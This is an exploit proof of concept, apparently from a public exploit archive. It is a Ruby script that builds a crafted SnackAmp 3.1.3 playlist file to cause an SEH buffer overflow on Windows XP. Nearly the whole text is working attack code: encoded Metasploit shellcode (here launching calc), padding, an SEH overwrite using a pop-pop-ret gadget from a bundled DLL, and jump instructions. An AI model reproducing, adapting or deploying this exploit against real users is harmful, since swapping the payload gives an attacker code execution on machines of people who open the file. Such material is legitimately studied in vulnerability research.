# Exploit Title: SnackAmp 3.1.3 Malicious SMP Buffer Overflow Vulnerability (SEH)
# Date: 12/12/10
# Author: james [AT] learnsecurityonline [DOT] com
# Software Link: http://snackamp.sourceforge.net/
# Version: 3.1.3
# Tested on: Windows XP SP3 EN
# CVE: N/A

# This version was just released as of 12/5/10

#! /usr/bin/env ruby

# jump over
nSEH = [0x06eb9090].pack('V')

# !search pop r32\npop r32\nret
# ppr from jpegtcl10.dll
SEH = [0x014be06b].pack('V')

# windows/exec - 144 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# EXITFUNC=seh, CMD=calc
payload =  "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc"
payload << "\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78"
payload << "\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85"
payload << "\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5"
payload << "\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c"
payload << "\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21"
payload << "\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5"
payload << "\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27"
payload << "\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3"
payload << "\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53"
payload << "\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f"
payload << "\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6"
payload << "\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8"
payload << "\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
payload << "\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f"
payload << "\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca"

junk = "\x41" * (8788 - payload.length)

nop = "\x90\x90"

# jmp $-160
jump = "\xe9\x5b\xff\xff\xff"

File.open("crash.smp", 'w') do |b|
	b.write junk + payload + nSEH + SEH + nop + jump
end
